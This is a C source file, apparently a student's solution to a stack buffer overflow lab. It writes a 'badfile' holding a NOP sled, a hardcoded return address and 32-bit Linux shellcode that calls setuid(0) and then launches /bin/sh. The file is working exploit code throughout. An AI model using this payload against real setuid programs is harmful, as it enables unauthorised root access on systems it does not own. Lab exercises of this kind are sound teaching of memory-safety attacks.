/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[] =
    "\x31\xc0" /* Line 1: xorl %eax,%eax */
    "\x31\xdb" /* Line 2: xorl %ebx,%ebx */
    "\xb0\xd5" /* Line 3: movb $0xd5,%al */
    "\xcd\x80" /* Line 4: int $0x80 */
               // ---- The code below is the same as the one in Task 2 ---
    "\x31\xc0" /* xorl    %eax,%eax              */
    "\x50"     /* pushl   %eax                   */
    "\x68""//sh" /* pushl   $0x68732f2f            */
    "\x68""/bin"     /* pushl   $0x6e69622f            */
    "\x89\xe3" /* movl    %esp,%ebx              */
    "\x50"     /* pushl   %eax                   */
    "\x53"     /* pushl   %ebx                   */
    "\x89\xe1" /* movl    %esp,%ecx              */
    "\x99"     /* cdq                            */
    "\xb0\x0b" /* movb    $0x0b,%al              */
    "\xcd\x80" /* int     $0x80                  */
    ;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    // buffer[28] = 0x30;
    // buffer[29] = 0xf1;
    // buffer[30] = 0xff;
    // buffer[31] = 0xbf;

    // buffer[32] = 0x30;
    // buffer[33] = 0xf1;
    // buffer[34] = 0xff;
    // buffer[35] = 0xbf;

    buffer[36] = 0x30;
    buffer[37] = 0xf1;
    buffer[38] = 0xff;
    buffer[39] = 0xbf;

    // buffer[40] = 0x30;
    // buffer[41] = 0xf1;
    // buffer[42] = 0xff;
    // buffer[43] = 0xbf;
    strcpy((buffer + 483), shellcode);

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
